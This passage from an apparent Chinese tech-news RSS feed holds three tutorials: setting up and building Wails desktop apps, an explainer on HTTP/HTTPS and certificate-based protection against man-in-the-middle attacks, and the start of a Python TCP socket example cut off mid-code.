在开始使用 Wails 之前，你需要在系统中安装它。按照文档的说明，使用以下命令安装 Wails：
go
install
github.com/wailsapp/wails/v2/cmd/wails@latest
确保你已经安装了 Go 语言，并将其添加到环境变量中。安装完成后，可以通过运行以下命令验证 Wails 是否成功安装：
wails doctor
git:
(
feat-wails
)
✗ wails docker
Wails CLI v2.9.2Available commands:build      Builds the application dev        Runs the application
in
development mode doctor     Diagnose your environment init       Initialises a new Wails project update     Update the Wails CLI show       Shows various information generate   Code Generation Tools version    The Wails CLI version Flags:-helpGet
help
on the
'wails'
command.
此命令将检查系统的依赖环境，并确保一切正常运行。
2. 创建 Wails 项目
创建项目的过程相当简单，只需运行以下命令即可：(PS: 最新版本需要-n参数指定项目名)
wails init -n wails-demo
这会启动一个交互式的 CLI 提示，你可以选择项目的类型。通常有两种模板供选择：
Vue 模板
：适合那些喜欢使用 Vue.js 构建前端的开发者。
React 模板
：适合那些习惯于使用 React 的开发者。
选择其中一种模板并输入项目名称后，Wails 会自动生成一个包含前端和后端代码的基本项目结构。
框架
项目
指定TypeScript
svelte
wails init -n myproject -t svelte
wails init -n myproject -t svelte-ts
react
wails init -n myproject -t react
wails init -n myproject -t react-ts
vue
wails init -n myproject -t vue
wails init -n myproject -t vue-ts
preact
wails init -n myproject -t preact
wails init -n myproject -t preact-ts
lit
wails init -n myproject -t lit
wails init -n myproject -t lit-ts
vanilla
wails init -n myproject -t vanilla
wails init -n myproject -t vanilla-ts
3. 项目结构
.
├── build/
│   ├── appicon.png
│   ├── darwin/
│   └── windows/
├── frontend/
├── go.mod
├── go.sum
├── main.go
└── wails.json
项目生成后，主要目录结构如下：
frontend/
：前端代码，通常使用你选择的框架（Vue/React）来编写。
go.mod
：Go 项目的模块定义文件。
main.go
：主要的 Go 语言入口文件，负责管理应用的后端逻辑。
wails.json
：Wails 项目的配置文件。
这个结构清晰地将前端和后端分离，使得开发者能够分别处理界面和逻辑部分。
frontend
目录没有特定于 Wails 的内容，可以是您选择的任何前端项目。
build
目录在构建过程中使用。 这些文件可以修改以自定义您的构建。 如果从 build 目录中删除文件，将重新生成默认版本。
go.mod
中的默认模块名称是“changeme”。 您应该将其更改为更合适的内容。
4. 运行项目
项目初始化完成后，可以通过以下命令运行项目：
wails dev
这个命令会启动开发服务器，并在默认浏览器中打开应用。在开发过程中，任何前端代码的修改都会被自动编译和更新，方便实时预览效果。
该程序执行以下操作：
- 构建您的应用程序并运行它
- 将您的 Go 代码绑定到前端，以便可以从 JavaScript 调用它
- 使用 Vite 的强大功能，将监视您的 Go 文件中的修改并在更改时重新构建/重新运行
- 启动一个 网络服务器 通过浏览器为您的应用程序提供服务。 这使您可以使用自己喜欢的浏览器扩展。 你甚至可以从控制台调用你的 Go 代码。
标志
描述
默认
-appargs “参数”
以 shell 样式传递给应用程序的参数
-assetdir “./path/to/assets”
从给定目录提供资产，而不是使用提供的资产 FS
wails.json
中的值
-browser
在启动时打开浏览器到
http://localhost:34115
-compiler “编译器”
使用不同的 go 编译器来构建，例如 go1.15beta1
go
-debounce
检测到资产更改后等待重新加载的时间
100 (毫秒)
-devserver “host:port”
将 wails 开发服务器绑定到的地址
“localhost:34115”
-extensions
触发重新构建的扩展（逗号分隔）
go
-forcebuild
强制构建应用程序
-frontenddevserverurl “url”
使用 3rd 方开发服务器 url 提供资产，例如：Vite
“”
-ldflags “标志”
传递给编译器的额外 ldflags
-loglevel “日志级别”
要使用的日志级别 - Trace, Debug, Info, Warning, Error
Debug（调试）
-nocolour
关闭彩色命令行输出
false
-noreload
资产更改时禁用自动重新加载
-nosyncgomod
不同步 go.mod 中的 Wails 版本
false
-race
使用 Go 的竞态检测器构建
false
-reloaddirs
触发重新加载的附加目录（逗号分隔）
wails.json
中的值
-s
跳过前端构建
false
-save
将指定的
assetdir
、
reloaddirs
、
wailsjsdir
、
debounce
、
devserver
和
frontenddevserverurl
标志的值保存到
wails.json
以成为后续调用的默认值。
-skipbindings
跳过 bindings 生成
-tags “额外标签”
传递给编译器的构建标签（引号和空格分隔）
-v
详细级别 (0 - silent, 1 - standard, 2 - verbose)
1
-wailsjsdir
生成生成的Wails JS模块的目录
wails.json
中的值
示例：wails dev -assetdir ./frontend/dist -wailsjsdir ./frontend/src -browser此命令将执行以下操作：构建应用程序并运行它（更多细节在 这里）
在 ./frontend/src 中生成 Wails JS 模块
监听 ./frontend/dist 中文件的更新并在更改时重新加载
打开浏览器并连接到应用程序
5. 构建项目
开发完成后，你可以通过以下命令构建桌面应用：
wails build
这个命令会生成适用于目标操作系统的可执行文件。生成的文件可以直接分发和安装，无需用户单独安装任何依赖。
标志
描述
默认
-clean
清理
build/bin
目录
-compiler “编译器”
使用不同的 go 编译器来构建，例如 go1.15beta1
go
-debug
Retains debug information in the application and shows the debug console. 允许在应用程序窗口中使用 devtools
-devtools
Allows the use of the devtools in the application window in production (when -debug is not used). Ctrl/Cmd+Shift+F12 may be used to open the devtools window.
NOTE
: This option will make your application FAIL Mac appstore guidelines. Use for debugging only.
-dryrun
打印构建命令但不执行它
-f
强制构建应用
-garbleargs
传递给 garble 的参数
-literals -tiny -seed=random
-ldflags “标志”
传递给编译器的额外 ldflags
-m
编译前跳过 mod tidy
-nopackage
不打包应用程序
-nocolour
在输出中禁用颜色
-nosyncgomod
不同步 go.mod 中的 Wails 版本
-nsis
为 Windows 生成 NSIS 安装程序
-o 文件名
输出文件名
-obfuscated
使用 garble 混淆应用程序
-platform
为指定的 平台（逗号分割）构建，例如：
windows/arm64
。
windows/arm64
。 注意，如果不给出架构，则使用
runtime.GOARCH
。
如果给定环境变量 platform =
GOOS
否则等于
runtime.GOOS
。 如果给定环境变量 arch =
GOARCH
否则等于
runtime.GOARCH
.
-race
使用 Go 的竞态检测器构建
-s
跳过前端构建
-skipbindings
跳过 bindings 生成
-tags “额外标签”
构建标签以传递给 Go 编译器。 必须引用。 空格或逗号（但不能同时使用）分隔
-trimpath
从生成的可执行文件中删除所有文件系统路径。
-u
更新项目的
go.mod
以使用与 CLI 相同版本的 Wails
-upx
使用 “upx” 压缩最终二进制文件
-upxflags
传递给 upx 的标志
-v int
详细级别 (0 - silent, 1 - default, 2 - verbose)
1
-webview2
WebView2 安装策略：download,embed,browser,error.
download
-windowsconsole
保留Windows构建控制台窗口
示例：wails build -clean -o myproject.exe信息
在 Mac 上，应用程序将被绑定到 Info.plist，而不是 Info.dev.plist。苹果芯片上的 UPX
在苹果芯片上使用 UPX 相关的 问题。Windows 上的 UPX
一些防病毒软件供应商误将 upx 压缩的二进制文件标记为病毒，请查看相关 问题。
6. 部署和发布
构建完成的应用可以直接发布。根据操作系统的不同，你可以打包成可安装文件（如 Windows 的
.exe
，MacOS 的
.dmg
等）。文档还提供了一些打包工具的建议，如
electron-builder
，方便对应用进行进一步的包装和签名。
支持的平台有：
平台
描述
darwin
MacOS + architecture of build machine
darwin/amd64
MacOS 10.13+ AMD64
darwin/arm64
MacOS 11.0+ ARM64
darwin/universal
MacOS AMD64+ARM64 universal application
windows
Windows 10/11 + architecture of build machine
windows/amd64
Windows 10/11 AMD64
windows/arm64
Windows 10/11 ARM64
linux
Linux + architecture of build machine
linux/amd64
Linux AMD64
linux/arm64
Linux ARM64
总结
Wails 通过结合前端技术和 Go 后端，提供了一个高效的方式来开发跨平台的桌面应用。其简单的项目初始化和清晰的结构使得开发者能够快速上手。通过 Wails，可以充分利用 Web 开发技能，同时获得原生桌面应用的优势。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540038.html</guid><pubDate>Fri, 31 Oct 2025 07:21:39 +0000</pubDate></item><item><title>网络原理 - HTTP/HTTPS</title><link>https://www.ppmy.cn/news/1540039.html</link><description>文章目录
HTTP
抓包工具
浏览器内置了抓包工具
Wireshark
Fiddler
使用
HTTP 协议格式
请求
响应
HTTP 请求 (Request)
URL 基本格式
URL encode
认识 "方法" (method)
GET 方法
POST 方法
经典面试题: 谈谈 GET 和 POST 的区别
其他方法
认识请求 "报头" (header)
HTTP 响应详解
认识 "状态码" (status code)
认识响应 "报头" (header)
认识响应 "正文" (body)
HTTPS
HTTPS 是什么
"加密" 是什么
HTTPS 的工作过程
对称加密
非对称加密
中间人攻击
引入证书
HTTP
HTTP (全称为 “超文本传输协议”) 是⼀种应用非常广泛的应用层协议
HTTP是典型的"一问一答"模式的协议,请求和响应是一一对应的
多问一答:上传大文件的时候
一问多答:下载大文件的时候
多问多答:远程桌面
HTTP 往往是基于传输层的 TCP 协议实现的 (HTTP1.0, HTTP1.1, HTTP2.0 均为TCP,HTTP3 基于UDP 实现)。目前我们主要使用的还是 HTTP1.1 和 HTTP2.0 。本文讨论的HTTP 以 1.1 版本为主
我们平时打开一个网站, 就是通过 HTTP 协议来传输数据的
当我们在浏览器中输入 搜狗搜索 的 “网址” (URL) 时, 浏览器就给搜狗的服务器发送 HTTP请求, 解析请求后搜狗的服务器就会返回 HTTP 响应。这个响应结果被浏览器解析之后, 就展示成我们看到的页面内容(这个过程中浏览器可能会给服务器发送多个 HTTP 请求, 服务器会对应返回多个响应, 这些响应里就包含了HTML, CSS, JavaScript, 图片, 字体等信息)
所谓 “超文本” 的含义, 就是传输的内容不仅仅是文本(比如 html, css 就是文本), 还可以是一些其他的资源, 比如图片, 视频, 音频等二进制的数据
抓包工具
理解HTTP协议工作过程,以及理解HTTP协议报文格式,需要"抓包工具"
抓包工具相当于一个"代理"程序。但是代理程序不等于抓包工具,还有浏览器插件/加速器…也是代理程序
浏览器访问 sogou.com 时, 就会把 HTTP 请求先发给 Fiddler, Fiddler 再把请求转发给 sogou 的服务器。当 sogou 服务器返回数据时, Fiddler 拿到返回数据, 再把数据交给浏览器。因此 Fiddler 对于浏览器和 sogou 服务器之间交互的数据细节, 都是非常清楚的
如果设备上同时运行多个代理程序,可能会冲突,无法正常工作了。因此抓包的时候一定要确保设备上的其他代理程序处于关闭状态
浏览器内置了抓包工具
在浏览器按下
F12
打开开发者工具,选中网络(Network)这一个标签页, 每一条记录都是一次 HTTP 请求/响应
这个工具不太直观
Wireshark
不仅仅能抓到HTTP,也能抓到TCP, UDP, IP, 以太网数据帧…
功能太强了,使用门槛太高,抓HTTP缺失针对性的优化
Fiddler
专门用来抓HTTP, 能把网络上传输的HTTP数据获取到,并且显示出来
如果抓到的包非常少,可能需要手动开启抓取 https 的功能
左上角选择 Tools - Options…
选择 HTTPS 标签页, 里面的框全部勾选上,勾选的过程会弹出一个框,这是问你是否要安装证书,一定要选择"Yes"才能抓取HTTPS。如果点了"No"就得重装Fiddler才能继续
使用
左侧窗口显示了所有的 HTTP请求/响应, 可以选中某个查看详情
蓝色的里面是HTML数据
黑色的里面是普通数据
可以使用 ctrl + a 全选左侧的抓包结果, delete 键清除所有被选中的结果
右侧上方显示了 HTTP 请求的报文内容(切换到 Raw 标签页可以看到详细的数据格式)
右侧下方显示了 HTTP 响应的报文内容(切换到 Raw 标签页可以看到详细的数据格式)
请求和响应切换到Raw标签页时, 可以点击右下角的 View in Notepad 通过记事本打开, 在记事本中就能随意调整字体和大小了
HTTP是文本协议,但是返回的响应比较大的时候,就可能把响应的数据压缩成二进制数据后再返回。服务器最宝贵的硬件资源就是网络带宽。压缩,相当于是用cpu资源换取带宽资源。压缩后的数据到达客户端,再让客户端解压缩
对于浏览器,解压缩是自动完成的;对于Fiddler来说,就需要手动的解压缩
HTTP 协议格式
请求
把记事本的自动换行取消,这样更好地观察格式
一个HTTP请求报文,分为四个部分:
首行
包含三个部分(使用空格区分):
请求的方法 : GET, POST…
请求的网址(URL)
版本号
请求头(header)
包含若干行,每一行是一个键值对，键与值之间使用
:
分割
空行
header后面存在一个空行,类似于链表的null,作为结束标记
正文(body)
可选的,可以有或者没有。可以填写任意数据,自由定义格式和内容
响应
一个HTTP响应报文,分为四个部分:
首行
包含三个部分(使用空格区分):
版本号
状态码
状态码描述
响应的报头(header)
空行
响应头的结束标记
正文
HTTP 请求 (Request)
URL 基本格式
平时我们俗称的 “网址” 其实就是 URL (Uniform Resource Locator 统一资源定位符)
互联网上的每个文件都有一个唯一的URL，URL包含文件的位置以及浏览器应该怎么处理它。URL 的详细规则由 因特网标准RFC1738 进行了约定
协议方案名: 描述了URL接下来干啥, 常见的有 http 和 https, 也有其他的类型(例如访问 mysql 时用的jdbc:mysql )
登陆信息: 现在的网站进行身份认证一般不用这个了,所以都会省略
服务器地址: 要访问的服务器的域名/IP
端口号: 当端口号省略的时候, 浏览器会根据协议类型自动决定使用哪个端口。 例如 http 协议默认使用 80 端口, https 协议默认使用 443 端口。如果默认的不匹配,就要显式写出端口号
带层次的文件路径:描述了要访问服务器的哪个资源
查询字符串(query string): 确定了访问的资源后可能还要给一些补充信息。本质是一个个键值对。键值对之间使用 &amp; 分隔; 键和值之间使用 = 分隔.
片段标识: 片段标识主要用于页面内跳转,区分页面不同的部分
URL 中的可省略部分
协议名: 可以省略, 省略后默认为 http://
ip 地址 / 域名: 在 HTML 中可以省略(比如 img, link, script, a 标签的 src 或者 href 属性)。省略后表示服务器的 ip / 域名与当前 HTML 所属的 ip / 域名一致
端口号: 可以省略
带层次的文件路径: 可以省略。省略后相当于 / .
查询字符串: 可以省略
片段标识: 可以省略
URL encode
像 / ? : 这样的字符, 已经被url当做分隔符理解了, 因此这些字符不能随意出现。如果某个参数中需要带有这些特殊字符, 就必须先对其进行转义,不然可能跳转失败
中文字符由 UTF-8 或者 GBK 这样的编码方式构成, 虽然在 URL 中没有特殊含义, 但是仍然需要进行转义。 否则浏览器可能把 UTF-8/GBK 编码中的某个字节当做 URL 中的特殊符号。转义的规则如下: 将需要转码的字符转为16进制，然后从右到左，取4位(不足4位直接处理)，每2位前面加上%，编码成%XY格式
例如在浏览器搜索C++
把URL复制粘贴到其他地方就显示出转码后的内容了
认识 “方法” (method)
方法
说明
支持的HTTP协议版本
GET
获取资源
1.0、1.1
POST
传输实体主体
1.0、1.1
PUT
传输文件
1.0、1.1
HEAD
获取报文首部
1.0、1.1
DELETE
删除文件
1.0、1.1
OPTIONS
询问支持的方法
1.1
TRACE
追踪路径
1.1
CONNECT
要求用隧道协议连接代理
1.1
LINK
建立和资源之间的联系
1.0
UNLINE
断开连接关系
1.0
GET 方法
GET 是最常用的 HTTP 方法, 常用于获取服务器上的某个资源
在浏览器地址栏中直接输入 URL或者点击收藏夹, 此时浏览器就会发送 GET 请求。另外, HTML 中的 link, img, script 等标签, 也会触发 GET 请求，还可以通过js构造
GET 请求的特点
首行的第一部分为 GET
URL 的 query string 可以为空, 也可以不为空
header 部分有若干个键值对结构
body 部分习惯为空
关于 GET 请求的 URL 长度问题:
HTTP 协议由 RFC 2616 标准定义, 标准原文中明确说明没有对 URL 的长度有任何的限制。实际 URL 的长度取决于浏览器的实现和 HTTP 服务器端的实现。在浏览器端, 不同的浏览器最大长度是不同的, 但是现代浏览器支持的长度一般都很长; 在服务器端, 一般这个长度是可以配置的
POST 方法
POST 方法也是一种常见的方法, 多用于提交用户输入的数据给服务器(例如登陆页面)
通过 HTML 中的 form 标签可以构造 POST 请求, 或者使用 JavaScript 的 ajax 也可以构造 POST 请求
POST 请求的特点
首行的第一部分为 POST
URL 的 query string 一般为空 (也可以不为空)
header 部分有若干个键值对结构.
body 部分一般不为空。body 内的数据格式通过 header 中的 Content-Type 指定； body 的长度由 header 中的 Content-Length 指定
经典面试题: 谈谈 GET 和 POST 的区别
从本质上讲, GET 和 POST 没啥差别,只是使用习惯有差别
语义不同: GET 一般用于获取数据, POST 一般用于提交数据
GET 的 body 一般为空, 需要传递的数据通过 query string 传递; POST 的 query string 一般为空, 需要传递的数据通过 body 传递
GET 请求一般是幂等的, POST 请求一般是不幂等的(如果同样的请求多次得到的结果一样, 就视为请求是幂等的)
GET 请求的结果可以被缓存,也可以被浏览器收藏夹收藏; POST 请求的结果不能被缓存(这一点也是承接幂等性)。设计一个浏览器可以缓存POST技术上完全可行,只是现在大部分浏览器都不支持
补充说明:
关于语义: GET 完全可以用于提交数据, POST 也完全可以用于获取数据
关于幂等性: 标准建议 GET 实现为幂等的, 实际开发中 GET 也不必完全遵守这个规则(主流网站都有"猜你喜欢" 功能, 会根据用户的历史行为实时更新现有的结果
关于安全性: 有些资料上说 “POST 比 GET 更安全”, 这样的说法是不科学的。 是否安全取决于在传输密码等敏感信息时是否对其加密, 和 GET 还是 POST 无关
关于传输数据量: 有的资料上说 “GET 传输的数据量小, POST 传输数据量大”, 这个也是不科学的。 标准没有规定 GET 的 URL 的长度, 也没有规定 POST 的 body 的长度。 传输数据量多少, 完全取决于不同浏览器和不同服务器之间的实现区别
关于传输数据类型: 有的资料上说 “GET 只能传输文本数据, POST 既可以传输文本,也可以传输二进制数据”， 这个也是不科学的。 GET 的 query string 虽然无法直接传输二进制数据, 但是可以进行urlencode 转义后进行传输。虽然 POST 可以直接传输二进制数据,很多时候也是转义之后通过文本的方式传输
RESTful 风格:
请求方式
含义
GET（SELECT）
从服务器取出资源（一项或多项）
POST（CREATE）
在服务器新建一个资源
PUT（UPDATE）
在服务器更新资源（更新完整资源）
PATCH（UPDATE）
在服务器更新资源， PATCH更新个别属性
DELETE（DELETE）
从服务器删除资源
其他方法
PUT 与 POST 相似，只是具有幂等特性，一般用于更新
DELETE 删除服务器指定资源
OPTIONS 返回服务器所支持的请求方法
HEAD 类似于GET，只不过响应体不返回，只返回响应头
这些方法的 HTTP 请求可以使用 ajax 来构造,也可以通过一些第三方工具。还有任何一个能进行网络编程的语言都可以构造,本质上就是通过 TCP socket 写入一个符合HTTP 协议规则的字符串
认识请求 “报头” (header)
header 的整体的格式是 “键值对” 结构,每个键值对占一行,键和值之间使用分号分割
报头的种类有很多, 此处仅介绍几个常见的
Host
表示请求对应的服务器主机的IP地址和端口
Content-Length
表示 body 中的数据长度。这样知道了body有多长,就知道了一个完整的HTTP请求从哪到哪,解决粘包问题
Content-Type
表示请求的 body 中的数据格式
常见选项:
application/x-www-form-urlencoded: form 表单提交的数据格式
multipart/form-data: form 表单提交的数据格式(在 form 标签中加上enctyped=“multipart/form-data” . 通常用于提交图片/文件
application/json: 数据为 json 格式
User-Agent (简称 UA)
表示浏览器/操作系统的属性。可以根据UA区分出来当前设备是电脑还是手机,从而实现兼容,比如是电脑就返回一个宽屏的网页,手机就返回一个窄屏,并且按钮比较大的网页
Referer
表示这个页面是从哪个页面跳转过来的
如果直接在浏览器中输入URL, 或者直接通过收藏夹访问页面 Referer 是空的
Cookie
存储键值对格式的内容,和query string类似,都是程序猿自定义的,可以根据不同的需求定义不同的数据,增加HTTP的可扩展性,但往往有一个键值对用来标识用户的身份信息。Cookie这里的键值对,都是
能够在客户端硬盘上持久化保存的
网页是运行在浏览器上的,一般情况下,网页不能直接访问客户端的硬盘,但有时候确实需要在客户端存储一些必要的信息,希望持久化存储。Cookie就是浏览器给网页提供的特定机制,不是让网页随意访问硬盘,而是对硬盘的操作做了特殊的封装,提供了一个/一组特殊的文件,只能在这个特殊的文件里写,并且是键值对的形式。这个文件是没法直接看到的,浏览器会分别给不同的网站(按照域名)创建一份Cookie文件,所以不同网站之间的 Cookie 并不冲突
服务器的响应返回Cookie数据给浏览器,存储下来,后续浏览器访问该网站的时候,就会在请求中把Cookie键值对发回给服务器
每个用户有不同的偏好, 服务器会给不同客户端响应个性化的Cookie数据,之后服务器就能从客户端请求的Cookie中了解到客户端的需求偏好了
会话id标识用户身份,以便查询到更多用户相关的信息
HTTP 响应详解
认识 “状态码” (status code)
状态码表示访问页面的结果 (是访问成功, 还是失败, 还是其他的一些情况…)
以下为常见的状态码:
200 OK
表示访问成功
404 Not Found
服务器没有找到客户端请求的资源
浏览器输入一个 URL, 目的就是为了访问对方服务器上的一个资源。 如果这个 URL 标识的资源不存在,那么就会出现 404
403 Forbidden
表示访问被拒绝。 有的页面需要用户具有一定的权限才能访问(登陆后才能访问)。 如果用户没有登陆直接访问, 就容易见到 403
405 Method Not Allowed
HTTP 中所支持的方法, 有 GET, POST, PUT, DELETE 等,但是服务器不一定都支持(或者不允许用户使用一些其他的方法)
500 Internal Server Error
服务器出现内部错误。 一般是服务器的代码执行过程中遇到了一些特殊情况(服务器异常崩溃)会产生这个状态码
504 Gateway Timeout
当服务器负载比较大的时候, 服务器处理请求的耗时就会很长, 就可能会出现超时的情况。这种情况在双十一等 “秒杀” 场景中容易出现, 平时不太容易见到
302 Move temporarily(临时重定向)
"重定向"就相当于手机号码中的 “呼叫转移” 功能,比如我原来的手机号是 186-1234-5678, 后来换了个新号码 135-1234-5678, 那么不需要让我的朋友知道新号码,只要我办理了"呼叫转移"业务, 其他人拨打 186-1234-5678 , 就会自动转移到 135-1234-5678 上
在POST请求中会经常见到 302 响应, 用于登陆成功后自动跳转到主页;还有的情况是访问的旧的网址,自动跳转到新的网址。响应报文的 header 部分会包含一个 Location 字段, 表示要跳转到哪个页面
301 Moved Permanently(永久重定向)
旧地址和新地址之间的映射关系是固定的,浏览器会缓存这样的映射关系,后续再次访问旧地址的时候,浏览器就可以直接构造新地址的请求,减少一次HTTP访问了。如果使用 302 作为重定向,旧地址是否要重定向,以及重定向到哪里是可变的,因此每次访问旧地址都需要访问服务器,获取到响应的Location 字段再进行跳转。301 也是通过 Location 字段来得知要重定向到的新地址
认识响应 “报头” (header)
响应报头的基本格式和请求报头的格式基本一致
类似于 Content-Type , Content-Length 等属性的含义也和请求中的含义一致
响应中的 Content-Type 常见取值有以下几种:
text/html : body 数据格式是 HTML
text/css : body 数据格式是 CSS
application/javascript : body 数据格式是 JavaScript
application/json : body 数据格式是 JSON
还可以指定字符集
认识响应 “正文” (body)
正文的具体格式取决于 Content-Type
HTTPS
HTTPS 是什么
HTTP 协议内容都是按照文本的方式明文传输的。 这就导致在传输过程中可能出现一些被篡改的情况。在互联网上, 明文传输是比较危险的事情!!!
HTTPS 也是应用层协议, 是在 HTTP 协议的基础上引入了一个加密层
HTTPS = HTTP + SSL(安全相关的协议)
“加密” 是什么
明文:要传输的真正数据
密文:加密之后的数据
密钥:用来加密和解密的数据
把明文 通过密钥 变成 密文 =&gt;加密
把密文 通过密钥 变成 明文 =&gt;解密
HTTPS 的工作过程
既然要保证数据安全, 网络传输中不能直接传输明文了, 而是加密之后的 “密文”
加密的方式有很多, 但是整体可以分成两大类: 对称加密 和 非对称加密
对称加密:加密和解密使用同一个密钥, 加密解密速度比较快
非对称加密:密钥是一对(分别称为 公钥 和 私钥),加密解密速度比较慢,安全性更高。使用公钥加密,此时就是私钥解密;使用私钥加密,此时就是公钥解密
所谓的安全都不是绝对的,只是破解的时间比较长,可能需要几十年
对称加密
对称加密其实就是通过同⼀个 “密钥” , 把明文加密成密文, 并且也能把密文解密成明文,就需要客户端和服务器都具有同一个对称密钥
但事情没这么简单, 服务器同一时刻其实是给很多客户端提供服务的。这么多客户端,用的密钥都必须是不同的(如果是相同的话, 密钥就太容易扩散了, 黑客也能拿到了)。 因此服务器就需要维护每个客户端和每个密钥之间的关联关系
比较理想的做法, 就是能在客户端和服务器建立连接的时候, 双方协商确定这次的密钥是啥
但是如果直接把密钥明文传输, 那么黑客也就能获得密钥了, 这样后续的加密操作就形同虚设了。
因此密钥的传输也必须加密传输!
但是要想对密钥进行对称加密, 就仍然需要对密钥的密钥进行加密,无限循环下去。 此时密钥的传输再用对称加密就行不通了
就需要引入非对称加密的方式针对对称密钥进行加密。非对称加密的速度比对称加密慢很多,所以不直接使用非对称的方式加密业务数据
非对称加密
非对称加密要用到两个密钥, 一个叫做 “公钥”, 一个叫做 “私钥”,公钥和私钥是配对的
服务器生成 公钥 和 私钥。当客户端连上服务器的时候,服务器就把自己的公钥告诉客户端,私钥还是服务器自己持有
客户端在本地生成对称密钥(每个客户端生成自己的,与其他客户端不同), 通过公钥对对称密钥加密, 发送给服务器。 由于中间的网络设备(可能是黑客)没有私钥, 即使截获了数据, 也无法还原出对称密钥
服务器通过私钥解密, 还原出客户端发送的对称密钥并且使用这个对称密钥加密返回给客户端的响应数据。后续客户端和服务器的通信都只用这个对称密钥加密即可。由于对称加密的效率比非对称加密高很多, 因此只是在开始阶段使用非对称加密对称密钥, 后续的传输仍然使用对称加密
那么接下来问题又来了:
客户端如何确定这个公钥是不是黑客伪造的?
中间人攻击
黑客可以冒充自己是服务器, 获取到对称密钥
引入证书
服务端在使用HTTPS前，需要向CA机构(公证机构)申领一份数字证书。数字证书含有发证机构、证书有效期、证书所有者、
服务器的公钥
、
数字签名
等信息。服务器把证书传输给浏览器，
浏览器从证书里获取公钥
就行了，证书证明服务端公钥的权威性,客户端就能分辨出是不是服务器的公钥了
当服务端申请CA证书的时候，CA机构会对该服务端进行审核，并专门为该网站形成数字签名，过程如下：
CA机构拥有非对称加密的私钥 pri 和公钥 pub
CA机构对申请的证书的明文数据进行hash(缩小签名密文的长度,加快数字签名的验证速度)，形成数据摘要
然后对数据摘要用私钥 pri 加密，得到数字签名。服务端申请的 证书明文 和 数字签名 共同组成了数字证书，这样一份数字证书就可以颁发给服务端了。通过证书解决中间人攻击, 在客户端和服务器刚建立连接的时候, 服务器给客户端返回一个数字证书,这个证书包含了服务器的公钥, 也包含了网站的身份信息。当客户端获取到这个证书之后, 会对证书进行校验(防止证书是伪造的)
判定证书的有效期是否过期
判定证书的发布机构是否受信任(操作系统中已内置受信任的证书发布机构)
验证证书是否被篡改: 从
系统中
拿到该证书发布机构的公钥, 对数字签名解密, 得到一个 hash 值, 设为 hash1。 然后自己再计算证书明文数据的 hash 值, 设为 hash2。 对比 hash1 和 hash2 是否相等。 如果相等, 则说明证书是没有被篡改过的,里面的公钥就是服务器的
黑客拿到数据摘要也很容易,毕竟系统中就有对应的公钥,但是无法篡改,也无法伪造
由于黑客不知道CA机构的私钥，所以hash之后无法用私钥加密形成数字签名，也就是不能改数字签名,一旦改了客户端就无法解密了,因为系统里没有对应的公钥
如果黑客只修改证书中的公钥(服务器公钥),不修改数字签名。客户端校验的时候就会发现自己算出来的数据摘要和数字签名中解密出来的数据摘要不一致,此时就会判定证书非法
中间人把证书整个掉包？
因为中间人没有CA私钥，所以无法制作假的证书
中间人只能向CA申请真证书，然后用自己申请的证书进行掉包
这个确实能做到证书的整体掉包，但是别忘记，证书明文中包含了域名等服务端认证信息，如果整体掉包，客户端依旧能够识别出来
Fiddler开启HTTPS的时候会有一个"安装证书"的过程,这个过程就是给你系统里新增一个Fiddler的公证机构。Fiddler抓包其实就是在进行中间人攻击,只不过这个过程是咱们用户可信任的,但是黑客没法做到这一点。系统中有哪些公证机构是可以查看的,被很多人盯着呢,如果制造商夹带私货,一旦被曝光出来,这个制造商以后就混不下去了
完整流程:
HTTPS 工作过程中涉及到的密钥有三组,其实一切都是围绕这个对称加密的密钥,其他的机制都是辅助这个密钥工作的
第一组(对称密钥): 客户端和服务器后续传输的数据都通过这个对称密钥加密解密
第二组(非对称密钥): 是为了让客户端把对称密钥
加密
传给服务器
第三组(非对称密钥): 用于校验证书是否被篡改,保证第二组非对称密钥是合法的</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540039.html</guid><pubDate>Fri, 31 Oct 2025 07:21:42 +0000</pubDate></item><item><title>网络通信与并发编程（二）基于tcp的套接字、基于udp的套接字、粘包现象</title><link>https://www.ppmy.cn/news/1540040.html</link><description>基于tcp的套接字
文章目录
基于tcp的套接字
一、套接字的工作流程
二、基于tcp的套接字通信
三、基于udp的套接字通信
四、粘包现象
一、套接字的工作流程
Socket是应用层与TCP/IP协议族通信的中间软件抽象层，它是一组接口。在设计模式中，Socket其实就是一个门面模式，它把复杂的TCP/IP协议族隐藏在Socket接口后面，对用户来说，一组简单的接口就是全部，让Socket去组织数据，以符合指定的协议。
所以，我们无需深入理解tcp/udp协议，socket已经为我们封装好了，我们只需要遵循socket的规定去编程，写出的程序自然就是遵循tcp/udp标准的。
服务器端先初始化Socket，然后与端口绑定(bind)，对端口进行监听(listen)，调用accept阻塞，等待客户端连接。在这时如果有个客户端初始化一个Socket，然后连接服务器(connect)，如果连接成功，这时客户端与服务器端的连接就建立了。客户端发送数据请求，服务器端接收请求并处理请求，然后把回应数据发送给客户端，客户端读取数据，最后关闭连接，一次交互结束。
二、基于tcp的套接字通信
基于上面的套接字工作原理，我们可以用python编写处如下的一段代码：
#服务端
import
socket
#socket.AF_INET表示套接字，socket.SOCK_STREAM表示tcp，tcp也称为流式协议
#创建套接字对象
phone
=
socket
.
socket
(
socket
.
AF_INET
,
socket
.
SOCK_STREAM
)
#绑定服务端ip和端口
phone
.
bind
(
(
'127.0.0.1'
,
8081
)
)
#开始监听，listen表示半连接池，限制的是请求数
phone
.
listen
(
5
)
# 连接循环，服务端需要一直开启等待客户端的连接(连接循环)
while
True
:
#收到客户端的请求，通过三次握手与四次挥手建立通信通道
#conn是建立的通信通道，client_addr是客户端的信息
#当没有建立链接请求时，服务端会一直停在phone.accept()处
conn
,
client_addr
=
phone
.
accept
(
)
#通信通道建立完成，与客户端持续通信(通信循环)
while
True
:
try
:
print
(
'服务端正在收数据...'
)
#为了降低内存的压力，需要限制每次接收的字节数
#当没有接收到客户端的消息时，服务端会一直停在conn.recv(1024)处
data
=
conn
.
recv
(
1024
)
#linux中客户端中断后服务端会接收空字符，此时需要跳出通信循环
if
len
(
data
)
==
0
:
break
print
(
'来自客户端的数据'
,
data
)
#回复客户端的信息
conn
.
send
(
data
.
upper
(
)
)
#windows中客户端连接中断会报错，需要用try推出通信循环
except
ConnectionResetError
:
break
#关闭通信通道，服务端准备与下一个客户端建立通信链接
conn
.
close
(
)
#关闭套接字对象
phone
.
close
(
)
#客户端
import
socketphone
=
socket
.
socket
(
socket
.
AF_INET
,
socket
.
SOCK_STREAM
)
#客户端不需要绑定ip和端口，只需向服务端的ip和端口发送请求
phone
.
connect
(
(
'127.0.0.1'
,
8080
)
)
